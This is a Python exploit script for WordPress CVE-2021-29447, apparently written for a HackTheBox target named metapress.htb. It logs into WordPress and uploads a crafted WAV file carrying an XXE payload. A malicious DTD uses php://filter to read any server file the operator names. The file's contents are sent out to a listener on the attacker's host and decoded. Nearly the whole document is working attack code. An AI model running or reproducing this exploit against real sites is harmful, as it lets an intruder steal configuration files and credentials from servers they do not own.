#!/usr/bin/dev python3

import argparse
import base64
import os
import pathlib
import re
import requests
import subprocess
import sys
import time
from urllib.parse import urlparse
import zlib


def argument_parser():
    """Parse argument provided to the script."""
    parser = argparse.ArgumentParser(description='WordPress CVE-2021-29447 authenticated exploit')

    parser.add_argument("-l", "--lhost",
                        required=True,
                        type=str,
                        help="""Host URL used be the listening server""")

    parser.add_argument("-r", "--rhost",
                        required=True,
                        type=str,
                        help="""Remote vulnerable WordPress URL""")

    parser.add_argument("-f", "--file",
                        type=pathlib.Path,
                        help="File where will be saved the exfiltred file")

    parser.add_argument("-u", "--user",
                        required=True,
                        type=str,
                        help="""Username used for WordPress authentication""")

    parser.add_argument("-p", "--password",
                        required=True,
                        type=str,
                        help="""Password used for WordPress authentication""")

    script_args = parser.parse_args()

    return script_args


def get_port(url):
    """Return port from URL."""
    parsed_url = urlparse(url)

    if parsed_url.port:
        return str(parsed_url.port)
    elif parsed_url.scheme == 'http':
        return '80'
    elif parsed_url.scheme == 'https':
        return '443'
    else:
        print("Error cannot get %s associated port" % url)
        exit(1)


def clean_temporary_files():
    """Remove temporary file used by script (DTD payload)."""
    os.remove('malicious.dtd')


def start_python_server(lhost):
    """Start Python WebServer locally on port specified in argument (lhost URL)."""
    python_server = subprocess.Popen([sys.executable, "-m", "http.server", get_port(lhost)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    os.set_blocking(python_server.stdout.fileno(), False)

    return python_server


def stop_python_server(python_server):
    """Stop Python WebServer before exiting script."""
    python_server.terminate()

    print("Python server stopped")


def check_connection(rhost, user, password):
    """Check authenticated connection to WordPress server ."""
    data = {
      'log': user,
      'pwd': password,
      'wp-submit': "Log+In",
      'redirect_to': rhost + "/wp-admin/",
      'testcookie': 1
    }

    response = requests.post(rhost + "/wp-login.php", data=data)

    if not response.status_code == 200:
        print("Bad response status : %s" % response.status_code)
        print("Exiting ...")
        exit(1)

    print("Succesfull connection to WordPress server" + '\n')

    return response.cookies


def create_malicious_wav(lhost):
    """Generate malicious WAV payload."""
    payload = b"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version='1.0'?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '" + bytes(lhost, encoding='utf-8') + b"/malicious.dtd'>%remote;%init;%trick;]>\x00"

    print("Malicous WAV generated" + '\n')

    return payload


def create_malicious_dtd_file(lhost, target_file):
    """Generate malicious DTD payload and store it locally."""
    with open('malicious.dtd', 'w') as file:
        file.write("<!ENTITY % file SYSTEM \"php://filter/zlib.deflate/read=convert.base64-encode/resource=" + target_file + "\">")
        file.write("<!ENTITY % init \"<!ENTITY &#x25; trick SYSTEM \'" + lhost + "?p=%file;\'>\" >")

    print("DTD file payload created" + '\n')


def retrieve_wp_nonce(rhost, cookies):
    """Retrieve _wpnonce from WordPress."""

    response = requests.get(rhost + '/wp-admin/media-new.php', cookies=cookies)

    matched_wp_nonce = re.findall(r'name="_wpnonce" value="(\w+)"', response.text)

    if not matched_wp_nonce:
        print("wp_nonce not found")
        print("Exiting ...")
        exit(1)

    print("WordPress _wpnonce %s founded and will be used" % matched_wp_nonce[0] + '\n')

    return matched_wp_nonce[0]


def upload_payload(rhost, cookies, wp_nonce, payload):
    """Upload payload to WorPress vulnerable media feature."""
    file_data = {'async-upload': ('malicious.wav', payload)}

    data = {
        'name': 'malicous.wav',
        'action': 'upload-attachment',
        '_wpnonce': wp_nonce
    }

    response = requests.post('http://metapress.htb/wp-admin/async-upload.php', data=data, files=file_data, cookies=cookies)

    if response.status_code == 200:
        if not response.json()['success']:
            print("Error during payload upload")
            print("Exiting ...")
            exit(1)
    elif response.status_code == 502:
        # TODO(investigate sometimes bad gateway response but exploitation ok)
        print("Bad gateway : %s" % response.status_code)
    elif response.status_code == 504:
        # TODO(investigate sometimes gateway timeout response but exploitation ok for first payload)
        print("Gateway timeout will work only for first payload : %s" % response.status_code)
    else:
        print("Bad response status : %s" % response.status_code + '\n')
        print(response.text)
        print("Exiting ...")
        exit(1)


def retrieve_targeted_file(python_server, counter):
    """Retrieve information and files from Python WebServer stdout."""
    payload_printed = False
    retrieved_file_printed = False
    printing_error = False

    for line in python_server.stdout.readlines():

        counter += counter

        if re.search(r'^Traceback', line):
            printing_error = True

        if printing_error:
            print(line)
            continue

        if re.search(r'GET \/malicious\.dtd', line):
            if not payload_printed:
                print("DTD payload retrievied from Python server" + '\n')
                print(line + '\n')
                payload_printed = True

        if re.search(r'\/\?p=', line):
            if not retrieved_file_printed:
                matched_file = re.search(r'\/\?p=(.+?)\s', line)
                if matched_file:
                    file = matched_file.group(1)
                    print("Retrieved file : "  + '\n')
                    print(zlib.decompress(base64.b64decode(file), -zlib.MAX_WBITS).decode('utf-8'))
                retrieved_file_printed = True

    if payload_printed and not retrieved_file_printed:
        print("File not found on server or not permission to read it" + '\n')

    if not payload_printed and not retrieved_file_printed:
        print("Error WAV payload not executed on WordPress")

    if printing_error:
        print("Exiting ...")
        exit(1)

    return counter


def main():
    """Run main program."""
    script_args = argument_parser()

    cookies = check_connection(script_args.rhost, script_args.user, script_args.password)

    wp_nonce = retrieve_wp_nonce(script_args.rhost, cookies)

    python_server = start_python_server(script_args.lhost)

    counter = 0

    while(True):

        target_file = input("\n\n\nExit script --> quit\n\nTarget file path : ")

        print('\n')

        if target_file == "quit":
            print("Exiting ...")
            break

        payload = create_malicious_wav(script_args.lhost)

        create_malicious_dtd_file(script_args.lhost, target_file)

        upload_payload(script_args.rhost, cookies, wp_nonce, payload)

        time.sleep(2)

        counter = retrieve_targeted_file(python_server, counter)

    stop_python_server(python_server)

    clean_temporary_files()


if __name__ == "__main__":
    main()